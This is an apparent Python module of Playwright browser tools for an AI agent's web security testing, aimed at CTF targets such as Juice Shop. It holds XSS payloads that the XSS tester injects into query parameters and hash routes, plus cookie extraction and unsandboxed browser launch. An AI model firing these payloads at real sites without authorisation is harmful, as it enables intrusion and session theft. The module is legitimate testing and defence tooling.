"""
Playwright Browser Automation Tools

Advanced browser automation for dynamic web application testing using Playwright.
Provides headless and headed browser control with full JavaScript execution support.

Chrome Infiltrator Series - Alpha-Chrome Clearance
"""

from __future__ import annotations

import asyncio
import json
import os
from typing import TYPE_CHECKING

from kryon.sdk.agents import function_tool

# Playwright will be imported dynamically to avoid initialization errors
try:
    from playwright.async_api import Browser, BrowserContext, Page, async_playwright

    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    if not TYPE_CHECKING:
        Browser = None
        BrowserContext = None
        Page = None


class BrowserManager:
    """Manages browser instances and contexts for automation tasks"""

    _playwright = None
    _browser: Browser | None = None
    _context: BrowserContext | None = None
    _page: Page | None = None
    _network_logs: list[dict] = []

    @classmethod
    async def initialize(cls, headless: bool = True):
        """Initialize browser instance"""
        if not PLAYWRIGHT_AVAILABLE:
            raise RuntimeError("Playwright not installed. Run: pip install playwright && playwright install chromium")

        if cls._playwright is None:
            cls._playwright = await async_playwright().start()

        if cls._browser is None:
            cls._browser = await cls._playwright.chromium.launch(
                headless=headless, args=["--no-sandbox", "--disable-setuid-sandbox"]
            )

        if cls._context is None:
            cls._context = await cls._browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            )

        if cls._page is None:
            cls._page = await cls._context.new_page()

            # Setup network interception
            cls._network_logs = []
            cls._page.on(
                "request",
                lambda request: cls._network_logs.append(
                    {
                        "type": "request",
                        "url": request.url,
                        "method": request.method,
                        "headers": request.headers,
                        "resource_type": request.resource_type,
                    }
                ),
            )
            cls._page.on(
                "response",
                lambda response: cls._network_logs.append(
                    {
                        "type": "response",
                        "url": response.url,
                        "status": response.status,
                        "headers": response.headers,
                    }
                ),
            )

    @classmethod
    async def get_page(cls) -> Page:
        """Get or create browser page"""
        await cls.initialize()
        return cls._page

    @classmethod
    async def cleanup(cls):
        """Cleanup browser resources"""
        if cls._page:
            await cls._page.close()
            cls._page = None
        if cls._context:
            await cls._context.close()
            cls._context = None
        if cls._browser:
            await cls._browser.close()
            cls._browser = None
        if cls._playwright:
            await cls._playwright.stop()
            cls._playwright = None

    @classmethod
    def get_network_logs(cls) -> list[dict]:
        """Get captured network traffic"""
        return cls._network_logs.copy()

    @classmethod
    def clear_network_logs(cls):
        """Clear network traffic logs"""
        cls._network_logs.clear()


def _run_async(coro):
    """Helper to run async functions synchronously"""
    own_loop = False
    try:
        loop = asyncio.get_event_loop()
        if loop.is_closed():
            raise RuntimeError("closed")
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        own_loop = True  # we created it → we must close it (was leaked per invocation)

    try:
        return loop.run_until_complete(coro)
    finally:
        if own_loop:
            loop.close()


@function_tool
def browser_navigate(
    url: str,
    wait_for: str = "load",  # load, domcontentloaded, networkidle
    timeout: int = 30000,
    extract_info: bool = True,
    ctf=None,
) -> str:
    """
    Navigate to a URL and extract page information.

    Args:
        url: Target URL to navigate to
        wait_for: Wait condition (load, domcontentloaded, networkidle)
        timeout: Navigation timeout in milliseconds
        extract_info: Extract page title, content, links, forms

    Returns:
        JSON with navigation result and page information

    Example:
        result = browser_navigate("https://example.com", wait_for="networkidle")
    """

    async def _navigate():
        page = await BrowserManager.get_page()
        BrowserManager.clear_network_logs()

        try:
            response = await page.goto(url, wait_until=wait_for, timeout=timeout)

            result = {
                "success": True,
                "url": page.url,
                "status_code": response.status if response else None,
                "final_url": page.url,
            }

            if extract_info:
                # Extract page information
                result["title"] = await page.title()

                # Extract links
                links = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('a[href]'))
                        .map(a => ({href: a.href, text: a.textContent.trim()}))
                        .slice(0, 50);
                }""")
                result["links"] = links

                # Extract forms
                forms = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('form')).map(form => ({
                        action: form.action,
                        method: form.method,
                        inputs: Array.from(form.querySelectorAll('input, textarea, select'))
                            .map(input => ({
                                name: input.name,
                                type: input.type || input.tagName.toLowerCase(),
                                id: input.id
                            }))
                    }));
                }""")
                result["forms"] = forms

                # Extract meta tags
                meta_tags = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('meta'))
                        .map(meta => ({
                            name: meta.name || meta.getAttribute('property'),
                            content: meta.content
                        }));
                }""")
                result["meta_tags"] = meta_tags

                # Extract scripts
                scripts = await page.evaluate("""() => {
                    return Array.from(document.querySelectorAll('script[src]'))
                        .map(s => s.src)
                        .slice(0, 20);
                }""")
                result["external_scripts"] = scripts

            return json.dumps(result, indent=2)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e), "url": url}, indent=2)

    return _run_async(_navigate())


@function_tool
def browser_screenshot(
    url: str = "",
    path: str = "screenshot.png",
    full_page: bool = True,
    element_selector: str = "",
    ctf=None,
) -> str:
    """
    Capture screenshot of web page or specific element.

    Args:
        url: URL to navigate to (optional if already on page)
        path: Output file path for screenshot
        full_page: Capture full scrollable page
        element_selector: CSS selector for specific element

    Returns:
        JSON with screenshot result and file path

    Example:
        result = browser_screenshot("https://example.com", full_page=True)
        result = browser_screenshot(element_selector="#login-form")
    """

    async def _screenshot():
        page = await BrowserManager.get_page()

        try:
            # Navigate if URL provided
            if url:
                await page.goto(url, wait_until="networkidle")

            # Ensure absolute path
            if not os.path.isabs(path):
                path_abs = os.path.join(os.getcwd(), path)
            else:
                path_abs = path

            # Capture screenshot
            if element_selector:
                element = await page.query_selector(element_selector)
                if element:
                    await element.screenshot(path=path_abs)
                else:
                    return json.dumps(
                        {"success": False, "error": f"Element not found: {element_selector}"},
                        indent=2,
                    )
            else:
                await page.screenshot(path=path_abs, full_page=full_page)

            return json.dumps(
                {
                    "success": True,
                    "path": path_abs,
                    "url": page.url,
                    "element_selector": element_selector if element_selector else None,
                    "full_page": full_page,
                },
                indent=2,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)}, indent=2)

    return _run_async(_screenshot())


@function_tool
def browser_execute_js(javascript: str, url: str = "", return_value: bool = True, ctf=None) -> str:
    """
    Execute JavaScript code in browser context.

    Args:
        javascript: JavaScript code to execute
        url: URL to navigate to first (optional)
        return_value: Whether to return execution result

    Returns:
        JSON with execution result

    Example:
        result = browser_execute_js("document.title")
        result = browser_execute_js("console.log('test'); return document.cookie")
    """

    async def _execute():
        page = await BrowserManager.get_page()

        try:
            # Navigate if URL provided
            if url:
                await page.goto(url, wait_until="domcontentloaded")

            # Execute JavaScript
            if return_value:
                result = await page.evaluate(javascript)
            else:
                await page.evaluate(javascript)
                result = None

            return json.dumps({"success": True, "result": result, "url": page.url}, indent=2)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e), "javascript": javascript[:100]}, indent=2)

    return _run_async(_execute())


@function_tool
def browser_fill_form(
    form_data: str,  # JSON string with field mappings
    submit: bool = True,
    submit_selector: str = "input[type='submit'], button[type='submit']",
    wait_after_submit: int = 2000,
    ctf=None,
) -> str:
    """
    Fill and optionally submit a web form.

    Args:
        form_data: JSON string with field name/selector to value mappings
        submit: Whether to submit the form after filling
        submit_selector: CSS selector for submit button
        wait_after_submit: Milliseconds to wait after submission

    Returns:
        JSON with form fill result

    Example:
        form_data = '{"#username": "admin", "#password": "test123"}'
        result = browser_fill_form(form_data, submit=True)
    """

    async def _fill_form():
        page = await BrowserManager.get_page()

        try:
            # Parse form data
            fields = json.loads(form_data)

            filled_fields = []
            for selector, value in fields.items():
                try:
                    await page.fill(selector, str(value))
                    filled_fields.append(selector)
                except Exception as e:
                    return json.dumps(
                        {"success": False, "error": f"Failed to fill {selector}: {str(e)}"},
                        indent=2,
                    )

            result = {"success": True, "filled_fields": filled_fields, "url": page.url}

            # Submit if requested
            if submit:
                try:
                    await page.click(submit_selector)
                    await page.wait_for_timeout(wait_after_submit)
                    result["submitted"] = True
                    result["final_url"] = page.url
                except Exception as e:
                    result["submit_error"] = str(e)

            return json.dumps(result, indent=2)

        except json.JSONDecodeError:
            return json.dumps({"success": False, "error": "Invalid JSON in form_data parameter"}, indent=2)
        except Exception as e:
            return json.dumps({"success": False, "error": str(e)}, indent=2)

    return _run_async(_fill_form())


@function_tool
def browser_intercept_traffic(
    action: str = "get",  # get, clear
    filter_type: str = "",  # xhr, fetch, document, script, stylesheet
    ctf=None,
) -> str:
    """
    Get or clear intercepted network traffic.

    Args:
        action: Action to perform (get, clear)
        filter_type: Filter by resource type (xhr, fetch, document, script, stylesheet)

    Returns:
        JSON with network traffic logs

    Example:
        result = browser_intercept_traffic(action="get", filter_type="xhr")
    """
    try:
        if action == "clear":
            BrowserManager.clear_network_logs()
            return json.dumps({"success": True, "action": "cleared", "message": "Network logs cleared"}, indent=2)

        logs = BrowserManager.get_network_logs()

        # Filter if requested
        if filter_type:
            logs = [log for log in logs if log.get("resource_type") == filter_type]

        return json.dumps(
            {
                "success": True,
                "count": len(logs),
                "filter_type": filter_type if filter_type else "all",
                "logs": logs,
            },
            indent=2,
        )

    except Exception as e:
        return json.dumps({"success": False, "error": str(e)}, indent=2)


@function_tool
def browser_analyze_dom(url: str = "", check_security: bool = True, extract_endpoints: bool = True, ctf=None) -> str:
    """
    Analyze DOM structure and identify security issues.

    Args:
        url: URL to navigate to (optional if already on page)
        check_security: Check for common security issues
        extract_endpoints: Extract API endpoints and URLs

    Returns:
        JSON with DOM analysis results

    Example:
        result = browser_analyze_dom("https://example.com", check_security=True)
    """

    async def _analyze():
        page = await BrowserManager.get_page()

        try:
            if url:
                await page.goto(url, wait_until="networkidle")

            analysis = {"success": True, "url": page.url}

            if check_security:
                # Check for security issues
                security_issues = await page.evaluate("""() => {
                    const issues = [];

                    // Check for inline event handlers
                    const elementsWithEvents = document.querySelectorAll('[onclick], [onload], [onerror]');
                    if (elementsWithEvents.length > 0) {
                        issues.push({
                            type: "inline_event_handlers",
                            count: elementsWithEvents.length,
                            severity: "medium",
                            description: "Inline event handlers detected (potential XSS vector)"
                        });
                    }

                    // Check for password inputs without autocomplete=off
                    const passwordFields = document.querySelectorAll('input[type="password"]:not([autocomplete="off"])');
                    if (passwordFields.length > 0) {
                        issues.push({
                            type: "password_autocomplete",
                            count: passwordFields.length,
                            severity: "low",
                            description: "Password fields allow autocomplete"
                        });
                    }

                    // Check for forms without CSRF tokens
                    const forms = document.querySelectorAll('form');
                    const formsWithoutToken = Array.from(forms).filter(form => {
                        return !form.querySelector('input[name*="csrf"], input[name*="token"]');
                    });
                    if (formsWithoutToken.length > 0) {
                        issues.push({
                            type: "missing_csrf_token",
                            count: formsWithoutToken.length,
                            severity: "high",
                            description: "Forms without apparent CSRF protection"
                        });
                    }

                    // Check for eval() or dangerous functions in scripts
                    const inlineScripts = Array.from(document.querySelectorAll('script:not([src])'))
                        .map(s => s.textContent);
                    const dangerousPatterns = inlineScripts.filter(script =>
                        /eval\\(|new Function\\(|innerHTML|outerHTML/.test(script)
                    );
                    if (dangerousPatterns.length > 0) {
                        issues.push({
                            type: "dangerous_js_functions",
                            count: dangerousPatterns.length,
                            severity: "high",
                            description: "Potentially dangerous JavaScript functions detected"
                        });
                    }

                    return issues;
                }""")
                analysis["security_issues"] = security_issues

            if extract_endpoints:
                # Extract API endpoints and interesting URLs
                endpoints = await page.evaluate("""() => {
                    const urls = new Set();

                    // From links
                    document.querySelectorAll('a[href]').forEach(a => {
                        if (a.href.includes('/api/') || a.href.includes('/rest/')) {
                            urls.add(a.href);
                        }
                    });

                    // From fetch/XHR in scripts
                    const scripts = Array.from(document.querySelectorAll('script:not([src])'))
                        .map(s => s.textContent).join(' ');

                    const urlPattern = /["'`](\\/api\\/[^"'`\\s]+|https?:\\/\\/[^"'`\\s]+\\/api\\/[^"'`\\s]+)["'`]/g;
                    let match;
                    while ((match = urlPattern.exec(scripts)) !== null) {
                        urls.add(match[1]);
                    }

                    return Array.from(urls).slice(0, 50);
                }""")
                analysis["api_endpoints"] = endpoints

            # Get page statistics
            stats = await page.evaluate("""() => {
                return {
                    total_elements: document.querySelectorAll('*').length,
                    forms: document.querySelectorAll('form').length,
                    inputs: document.querySelectorAll('input').length,
                    links: document.querySelectorAll('a').length,
                    scripts: document.querySelectorAll('script').length,
                    iframes: document.querySelectorAll('iframe').length
                };
            }""")
            analysis["statistics"] = stats

            return json.dumps(analysis, indent=2)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)}, indent=2)

    return _run_async(_analyze())


@function_tool
def browser_extract_cookies(url: str = "", ctf=None) -> str:
    """
    Extract and analyze cookies from current page.

    Args:
        url: URL to navigate to (optional if already on page)

    Returns:
        JSON with cookie information and security analysis

    Example:
        result = browser_extract_cookies("https://example.com")
    """

    async def _extract_cookies():
        page = await BrowserManager.get_page()
        context = await page.context

        try:
            if url:
                await page.goto(url, wait_until="domcontentloaded")

            # Get cookies from context
            cookies = await context.cookies()

            # Analyze cookie security
            analyzed_cookies = []
            security_warnings = []

            for cookie in cookies:
                analyzed = {
                    "name": cookie.get("name"),
                    "value": cookie.get("value")[:50] + "..."
                    if len(cookie.get("value", "")) > 50
                    else cookie.get("value"),
                    "domain": cookie.get("domain"),
                    "path": cookie.get("path"),
                    "secure": cookie.get("secure", False),
                    "httpOnly": cookie.get("httpOnly", False),
                    "sameSite": cookie.get("sameSite", "None"),
                }
                analyzed_cookies.append(analyzed)

                # Security checks
                if not cookie.get("secure") and "session" in cookie.get("name", "").lower():
                    security_warnings.append(
                        {
                            "cookie": cookie.get("name"),
                            "issue": "Session cookie without Secure flag",
                            "severity": "high",
                        }
                    )

                if not cookie.get("httpOnly") and "session" in cookie.get("name", "").lower():
                    security_warnings.append(
                        {
                            "cookie": cookie.get("name"),
                            "issue": "Session cookie without HttpOnly flag (vulnerable to XSS)",
                            "severity": "high",
                        }
                    )

                if cookie.get("sameSite") == "None" and not cookie.get("secure"):
                    security_warnings.append(
                        {
                            "cookie": cookie.get("name"),
                            "issue": "SameSite=None without Secure flag",
                            "severity": "medium",
                        }
                    )

            return json.dumps(
                {
                    "success": True,
                    "url": page.url,
                    "cookie_count": len(cookies),
                    "cookies": analyzed_cookies,
                    "security_warnings": security_warnings,
                },
                indent=2,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)}, indent=2)

    return _run_async(_extract_cookies())


# Unique marker: a fired dialog carrying THIS string proves OUR payload executed (not an
# incidental app alert). Kept short/alnum so it survives HTML/URL contexts unchanged.
_XSS_EXEC_MARKER = "KR9XSSPWN"


def _xss_exec_payloads(marker: str) -> list[str]:
    """XSS payloads that call ``alert(marker)``.

    The proof is the fired dialog carrying ``marker`` — that means the JS actually EXECUTED in
    the browser, not merely that the string was reflected in the HTML (which any JSON API does).
    Covers the reliable auto-firing sinks (img/svg error/load handlers) plus the classic
    ``javascript:`` iframe (Juice Shop's canonical DOM-XSS search payload) and a script tag.
    """
    return [
        f"<img src=x onerror=alert('{marker}')>",
        f"<svg/onload=alert('{marker}')>",
        f"<iframe src=\"javascript:alert('{marker}')\"></iframe>",
        f"\"'><script>alert('{marker}')</script>",
        f"javascript:alert('{marker}')",
    ]


def _xss_candidate_urls(url: str, payload: str) -> list[str]:
    """Injection points for ``payload`` given a base ``url``.

    Two families: (1) query-param injection on the URL itself (server-reflected XSS), and
    (2) SPA hash-route injection — Angular/React apps (Juice Shop) route the fragment
    client-side and render it into a DOM sink, so the payload never reaches the server and
    curl/nuclei never see it. Percent-encoded so special chars survive the URL.
    """
    from urllib.parse import quote

    enc = quote(payload, safe="")
    sep = "&" if "?" in url else "?"
    urls = [f"{url}{sep}{p}={enc}" for p in ("q", "search", "query", "id", "test")]
    base = url.split("#", 1)[0].rstrip("/")
    for route in ("search?q=", "track-result?id=", "complain?message=", "contact?msg="):
        urls.append(f"{base}/#/{route}{enc}")
    return urls


@function_tool
def browser_test_xss(
    url: str,
    test_payloads: str = "",  # Comma-separated custom payloads
    test_reflected: bool = True,
    test_stored: bool = False,
    test_dom: bool = True,
    ctf=None,
) -> str:
    """
    Test for XSS by CONFIRMING EXECUTION, not mere reflection.

    Injects marker-carrying ``alert()`` payloads across query params and SPA hash-routes, then
    listens for a real browser dialog. A fired dialog whose message carries our unique marker is
    proof-of-exploit: the JavaScript actually executed in the browser — the contundent signal that
    curl/nuclei cannot produce (they only see the raw JSON a normal API returns). Falls back to a
    lower-severity ``reflected_xss_unverified`` heuristic only when nothing executes.

    Args:
        url: Target URL to test (base URL; SPA hash-routes are derived from it)
        test_payloads: Custom payloads (comma-separated); defaults to the marker payloads
        test_reflected: Also run the raw-reflection heuristic when no execution is proven
        test_stored: Test for stored XSS (requires form submission)
        test_dom: Report dangerous DOM sinks as secondary signal

    Returns:
        JSON with ``executed`` (bool) and ``vulnerabilities_found``; an ``xss_executed`` entry
        carries the fired-dialog proof.

    Example:
        result = browser_test_xss("http://juice_shop:3000")  # DOM-XSS on /#/search?q=
    """

    async def _test_xss():
        page = await BrowserManager.get_page()
        _dialog_tasks: list = []
        _on_dialog = None

        try:
            marker = _XSS_EXEC_MARKER
            # Use custom payloads if provided, else the marker-carrying execution payloads.
            if test_payloads:
                payloads = [p.strip() for p in test_payloads.split(",")]
            else:
                payloads = _xss_exec_payloads(marker)

            results = {
                "success": True,
                "url": url,
                "payloads_tested": len(payloads),
                "executed": False,
                "vulnerabilities_found": [],
            }

            # --- EXECUTION PROOF: capture any real JS dialog our payload fires. A dialog whose
            # message carries our unique marker is proof the JS EXECUTED in the browser — the
            # contundent proof-of-exploit for DOM/reflected XSS (curl/nuclei can't see this). ---
            fired: list[str] = []

            def _on_dialog(dialog):
                fired.append(dialog.message)

                async def _safe_dismiss():
                    try:
                        await dialog.dismiss()
                    except Exception:  # TargetClosedError once the page navigated/closed
                        pass

                # Track the fire-and-forget dismiss so its exception is retrieved
                # in the finally (else asyncio prints "Future exception was never
                # retrieved" when the page navigates out from under it).
                _dialog_tasks.append(asyncio.ensure_future(_safe_dismiss()))

            page.on("dialog", _on_dialog)

            proven = False
            for payload in payloads:
                for test_url in _xss_candidate_urls(url, payload):
                    fired.clear()
                    try:
                        await page.goto(test_url, wait_until="networkidle", timeout=12000)
                        await page.wait_for_timeout(1200)  # let the SPA route + render + fire
                    except Exception:
                        pass
                    if any(marker in m for m in fired):
                        results["executed"] = True
                        results["vulnerabilities_found"].append(
                            {
                                "type": "xss_executed",
                                "payload": payload,
                                "test_url": test_url,
                                "severity": "critical",
                                "proof": f"alert('{marker}') fired — JavaScript executed in the browser",
                            }
                        )
                        proven = True
                        break
                if proven:
                    break

            # Secondary heuristic (only if nothing executed): flag raw reflection in the HTML.
            if test_reflected and not proven:
                for payload in payloads:
                    test_url = f"{url}{'&' if '?' in url else '?'}test={payload}"
                    try:
                        await page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
                        html_content = await page.content()
                        if payload in html_content:
                            results["vulnerabilities_found"].append(
                                {
                                    "type": "reflected_xss_unverified",
                                    "payload": payload,
                                    "location": "URL parameter",
                                    "severity": "medium",
                                    "note": "reflected unescaped but execution not confirmed",
                                    "test_url": test_url,
                                }
                            )
                    except Exception:
                        pass  # Timeout or error, continue testing

            # Test DOM-based XSS
            if test_dom:
                await page.goto(url, wait_until="domcontentloaded")

                # Check for dangerous sinks
                dom_sinks = await page.evaluate("""() => {
                    const sinks = [];
                    const scripts = Array.from(document.querySelectorAll('script:not([src])'))
                        .map(s => s.textContent).join('\\n');

                    // Check for dangerous patterns
                    if (/innerHTML|outerHTML/.test(scripts)) {
                        sinks.push({sink: "innerHTML/outerHTML", pattern: "Dynamic HTML insertion"});
                    }
                    if (/document\\.write/.test(scripts)) {
                        sinks.push({sink: "document.write", pattern: "Direct DOM write"});
                    }
                    if (/eval\\(|new Function\\(/.test(scripts)) {
                        sinks.push({sink: "eval/Function", pattern: "Code execution"});
                    }
                    if (/location\\.href|location\\.search/.test(scripts)) {
                        sinks.push({sink: "location", pattern: "URL manipulation"});
                    }

                    return sinks;
                }""")

                if dom_sinks:
                    results["vulnerabilities_found"].append(
                        {
                            "type": "dom_xss_potential",
                            "sinks_found": dom_sinks,
                            "severity": "medium",
                            "description": "Dangerous JavaScript sinks detected",
                        }
                    )

            results["total_vulnerabilities"] = len(results["vulnerabilities_found"])

            return json.dumps(results, indent=2)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)}, indent=2)
        finally:
            # Drain the fire-and-forget dialog dismissers so their exceptions
            # (TargetClosedError once the page navigated) are retrieved — not
            # dumped as "Future exception was never retrieved" at GC — and drop
            # the listener so it doesn't accumulate on the singleton page.
            if _on_dialog is not None:
                try:
                    page.remove_listener("dialog", _on_dialog)
                except Exception:
                    pass
            if _dialog_tasks:
                await asyncio.gather(*_dialog_tasks, return_exceptions=True)

    return _run_async(_test_xss())
